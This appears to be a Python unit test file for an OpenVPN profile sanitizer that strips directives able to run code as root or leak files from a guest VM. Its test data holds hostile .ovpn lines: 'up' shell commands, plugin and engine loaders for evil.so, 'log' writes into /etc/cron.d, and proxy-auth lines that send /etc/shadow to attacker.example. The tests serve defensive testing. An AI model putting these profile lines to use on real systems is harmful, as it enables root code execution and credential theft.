"""CWE-94: an imported .ovpn must not run code as root in the guest.

Run: python3 -B -m unittest discover -s Tests/GuestGraphicsTests -p "test_openvpn*" -v
"""

import importlib.util
from pathlib import Path
import unittest


ROOT = Path(__file__).resolve().parents[2]
SCRIPTS = ROOT / "Sources/SandboxEngine/Resources/vm-setup/scripts"


def load_script(name):
    spec = importlib.util.spec_from_file_location(name.replace("-", "_"), SCRIPTS / (name + ".py"))
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


config = load_script("config-agent")

HOSTILE = """client
dev tun
proto udp
remote vpn.example 1194
script-security 2
up "/bin/sh -c 'touch /tmp/pwned'"
--down /tmp/x.sh
route-up /tmp/y.sh
  TLS-Verify /tmp/z.sh
plugin /tmp/evil.so
iproute /tmp/fake-ip
management 0.0.0.0 7505
config /etc/shadow
log /etc/cron.d/pwn
auth-user-pass /tmp/creds
# up /tmp/commented.sh
<ca>
-----BEGIN CERTIFICATE-----
up looks-like-a-directive-but-is-cert-data
-----END CERTIFICATE-----
</ca>
cipher AES-256-GCM
"""


class OpenVPNConfigTests(unittest.TestCase):
    def test_root_running_directives_are_dropped(self):
        lines, dropped = config.sanitize_ovpn(HOSTILE)
        names, inline = set(), False
        for l in lines:
            s = l.strip()
            if s.startswith("<"):
                inline = not s.startswith("</")
                continue
            if inline or not s or s.startswith("#"):
                continue
            names.add(s.split(None, 1)[0].lower().lstrip("-"))
        for bad in ["script-security", "up", "down", "route-up", "tls-verify", "plugin",
                    "iproute", "management", "config", "log", "auth-user-pass"]:
            self.assertNotIn(bad, names, bad)
            self.assertIn(bad, dropped, bad)
        for good in ["client", "dev", "proto", "remote", "cipher"]:
            self.assertIn(good, names, good)

    def test_inline_blocks_and_comments_are_kept_verbatim(self):
        lines, _ = config.sanitize_ovpn(HOSTILE)
        text = "\n".join(lines)
        self.assertIn("up looks-like-a-directive-but-is-cert-data", text)
        self.assertIn("<ca>", text)
        self.assertIn("</ca>", text)
        self.assertIn("# up /tmp/commented.sh", text)

    def test_launch_overrides_script_security_after_the_config(self):
        src = (SCRIPTS / "openvpn-agent.py").read_text()
        launch = src[src.index("openvpn --config"):]
        launch = launch[:launch.index("% (OVPN_CONFIG")]
        self.assertIn("--script-security 1", launch)
        self.assertLess(launch.index("--config"), launch.index("--script-security 1"))


    # CWE-73: OpenVPN undoes quotes before it reads the option name, ends
    # an inline block at a line that STARTS with its close tag, and reads a
    # long line in 256-byte pieces. The sanitizer reads the file the same
    # way, so none of these is kept.
    def kept_names(self, text):
        lines, dropped = config.sanitize_ovpn(text)
        names, close = [], None
        for l in lines:
            if close is not None:
                if l.lstrip().startswith(close):
                    close = None
                continue
            t = config.openvpn_parse_line(l)
            if not t:
                continue
            n = t[0][2:] if t[0].startswith("--") and len(t[0]) >= 3 else t[0]
            if len(t) == 1 and n.startswith("<") and n.endswith(">"):
                close = "</%s>" % n[1:-1]
                n = n[1:-1]
            names.append(n.lower())
        return names, dropped

    def test_quoted_names_are_read_as_openvpn_reads_them(self):
        text = """client
"log" /mnt/share/profile.img
'log' /mnt/share/profile.img
"--log" /etc/passwd
'log-append' /mnt/share/profile.img
"--status" /mnt/share/profile.img
"lo"g /tmp/x
--"up" /tmp/x.sh
remote vpn.example 1194
"""
        names, dropped = self.kept_names(text)
        for bad in ["log", "log-append", "status", "up", "--up"]:
            self.assertNotIn(bad, names, bad)
        self.assertGreaterEqual(dropped.count("log"), 3)
        self.assertIn("log-append", dropped)
        self.assertIn("status", dropped)
        # `"lo"g` is two tokens to OpenVPN ("lo", "g"): an unknown option.
        self.assertIn("lo", names)
        self.assertIn("remote", names)
        self.assertIn("client", names)

    def test_tokenizer_matches_openvpn_parse_line(self):
        p = config.openvpn_parse_line
        self.assertEqual(p('"log" /x'), ["log", "/x"])
        self.assertEqual(p("'log-append' '/a b'"), ["log-append", "/a b"])
        self.assertEqual(p('"lo"g'), ["lo", "g"])
        self.assertEqual(p('a\\ b c'), ["a b", "c"])
        self.assertEqual(p('"a\\"b"'), ['a"b'])
        self.assertEqual(p("  # comment"), [])
        self.assertEqual(p("remote x # trailing"), ["remote", "x"])
        self.assertIsNone(p("l\\og /x"))          # bad backslash: OpenVPN ignores the line
        self.assertIsNone(p('"log /x'))            # unclosed quote: ignored

    def test_inline_block_ends_where_openvpn_ends_it(self):
        text = """client
<ca>
-----BEGIN CERTIFICATE-----
  </ca>trailing text ends the block for OpenVPN
log /mnt/share/profile.img
"""
        names, dropped = self.kept_names(text)
        self.assertNotIn("log", names)
        self.assertIn("log", dropped)
        # A forbidden inline block goes whole.
        names, dropped = self.kept_names("<config>\nup /x\n</config>\nclient\n")
        self.assertIn("config", dropped)
        self.assertEqual(names, ["client"])

    def test_a_line_openvpn_would_split_is_dropped(self):
        long_line = "remote " + "a" * 249 + "log /mnt/share/profile.img"
        lines, dropped = config.sanitize_ovpn("client\n" + long_line + "\n")
        self.assertEqual(lines, ["client"])
        self.assertTrue(dropped)
        for l in config.sanitize_ovpn(HOSTILE)[0]:
            self.assertLess(len(l.encode()), 255)

    def test_library_loaders_are_dropped(self):
        names, dropped = self.kept_names(
            "engine /mnt/share/evil.so\nproviders /mnt/share/evil\n"
            "pkcs11-providers /mnt/share/evil.so\nreplay-persist /etc/passwd\nclient\n")
        self.assertEqual(names, ["client"])
        for bad in ["engine", "providers", "pkcs11-providers", "replay-persist"]:
            self.assertIn(bad, dropped)

    # CWE-73: a proxy's username/password FILE is read by root and its two
    # lines sent to the proxy the profile names — /etc/shadow, or our own
    # credentials file, to attacker.example.
    def test_proxy_auth_files_are_dropped(self):
        text = """client
dev tun
proto tcp
remote 203.0.113.5 1194
nobind
http-proxy attacker.example 8080 /etc/openvpn/bromure-auth.txt
"http-proxy" attacker.example 8080 /etc/shadow basic
socks-proxy attacker.example 1080 /etc/shadow
http-proxy-user-pass /etc/shadow
"""
        lines, dropped = config.sanitize_ovpn(text)
        kept = "\n".join(lines)
        self.assertNotIn("/etc/shadow", kept)
        self.assertNotIn("bromure-auth.txt", kept)
        self.assertGreaterEqual(dropped.count("http-proxy"), 2)
        self.assertIn("socks-proxy", dropped)
        self.assertIn("http-proxy-user-pass", dropped)
        self.assertIn("remote 203.0.113.5 1194", kept)

    def test_proxies_without_a_file_stay(self):
        text = """http-proxy proxy.corp 3128
http-proxy proxy.corp 3128 auto
socks-proxy proxy.corp 1080
<http-proxy-user-pass>
user
pass
</http-proxy-user-pass>
"""
        lines, dropped = config.sanitize_ovpn(text)
        self.assertEqual(lines, text.splitlines())
        self.assertEqual(dropped, [])

    def test_connection_blocks_are_sanitized_too(self):
        text = """client
<connection>
remote 203.0.113.5 1194 tcp
http-proxy attacker.example 8080 /etc/shadow
"socks-proxy" attacker.example 1080 /etc/shadow
</connection>
"""
        lines, dropped = config.sanitize_ovpn(text)
        self.assertEqual(lines, ["client", "<connection>", "remote 203.0.113.5 1194 tcp", "</connection>"])
        self.assertIn("http-proxy", dropped)
        self.assertIn("socks-proxy", dropped)

if __name__ == "__main__":
    unittest.main()
